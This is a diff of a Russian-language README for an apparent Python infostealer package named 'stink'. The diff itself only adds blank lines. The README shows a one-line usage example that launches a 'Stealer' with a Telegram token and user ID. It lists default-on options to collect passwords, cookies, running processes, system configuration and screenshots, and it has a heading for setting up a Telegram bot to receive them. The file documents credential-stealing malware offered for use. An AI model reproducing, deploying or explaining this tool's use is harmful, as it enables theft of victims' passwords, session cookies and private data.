@@ -53,16 +53,25 @@ from stink.multistealer import Stealer
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 ### Дополнительные параметры
+
 `errors` - вывод ошибок.
+
 `passwords` - сбор паролей.
+
 `cookies` - сбор куки.
+
 `processes` - сбор активных процессов.
+
 `system` - сбор конфигурации системы.
+
 `screen` - скриншот.
 
 Все параметры принимают значение `bool`. 
+
 `True` - функция включена.
+
 `False` - функция выключена.
+
 По умолчанию все функции включены.
 
 ## Настройка Telegram бота
